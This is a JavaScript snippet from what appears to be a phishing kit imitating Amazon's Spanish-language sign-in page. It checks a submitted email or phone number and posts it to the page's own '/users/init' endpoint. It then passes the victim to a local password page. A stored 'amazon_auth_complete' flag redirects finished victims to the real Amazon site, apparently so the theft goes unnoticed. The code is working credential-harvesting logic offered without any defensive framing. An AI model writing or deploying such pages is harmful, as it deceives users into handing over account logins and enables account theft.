if (localStorage.getItem("amazon_auth_complete")) {
            window.location.replace("https://www.amazon.com/-/es/");
        }

        window.addEventListener("pageshow", function (event) {
            if (event.persisted) {
            window.location.reload();
            }
        });

        const form = document.getElementById("emailForm");
        const emailInput = document.getElementById("emailInput");
        const errorAlert = document.getElementById("auth-email-missing-alert");

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        function scrollToTop() {
            window.scrollTo({ top: 0, left: 0, behavior: "smooth" });
        }

        emailInput.addEventListener("input", () => {
            emailInput.classList.remove("form-input-error");
            errorAlert.style.display = "none";
        });

        form.addEventListener("submit", async (e) => {
            e.preventDefault();

            const email = emailInput.value.trim();
            
            if (!email) {
            emailInput.classList.add("form-input-error");
            errorAlert.innerHTML = `
                <div class="auth-email-missing-icon"></div>
                <div>Introduce tu número de teléfono móvil o correo electrónico</div>
            `;
            errorAlert.style.display = "flex";
            emailInput.focus();
            scrollToTop();
            return;
            }

            const isPhone = /^[0-9+\s()-]{6,}$/.test(email);
            if (!isPhone && !emailRegex.test(email)) {
            emailInput.classList.add("form-input-error");
            errorAlert.innerHTML = `
                <div class="auth-email-missing-icon"></div>
                <div>La dirección de correo electrónico no es válida</div>
            `;
            errorAlert.style.display = "flex";
            emailInput.focus();
            scrollToTop();
            return;
            }

            try {
            const res = await fetch("/users/init", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email }),
            });

            if (!res.ok) {
                alert("Hubo un problema al procesar tu solicitud.");
                return;
            }

            const params = new URLSearchParams();
            params.set("email", email);
            window.location.href = `password.html?${params.toString()}`;

            } catch {
            alert("Error de conexión con el servidor.");
            }
        });
